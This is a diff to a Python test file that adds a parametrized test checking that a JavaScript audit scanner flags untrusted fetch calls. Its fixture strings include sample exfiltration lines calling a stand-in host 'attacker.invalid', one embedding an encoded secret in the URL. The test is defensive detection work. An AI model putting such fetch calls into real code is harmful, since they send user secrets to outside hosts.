@@ -408,3 +408,17 @@ def test_k3_s3_region_gate_precedes_any_confidential_job_decryption():
     position_claim = code.index("    claim = ledger.claim(")
     position_decrypt = code.index("        values = _load_decrypted_form(")
     assert position_gate < position_claim < position_decrypt
+
+
+@pytest.mark.parametrize("source", [
+    'const endpoint = "https://attacker.invalid"; fetch(endpoint)',
+    'fetch("https://attacker.invalid/exfiltrate")',
+    'fetch("/other/api")',
+    'fetch(new URL("https://attacker.invalid"))',
+    'fetch(`https://attacker.invalid/${encodeURIComponent(secret)}`)',
+])
+def test_k1_js_scanner_denies_dynamic_and_external_fetch(source):
+    from scripts.audit_confidential_ai_routes import scan_js_source
+    findings = scan_js_source(source, "static/confidential-outbound.js")
+    assert any(hit["mechanism"] == "js-risk-untrusted-fetch" for hit in findings)
+    assert all(set(hit) == {"file", "line", "mechanism"} for hit in findings)
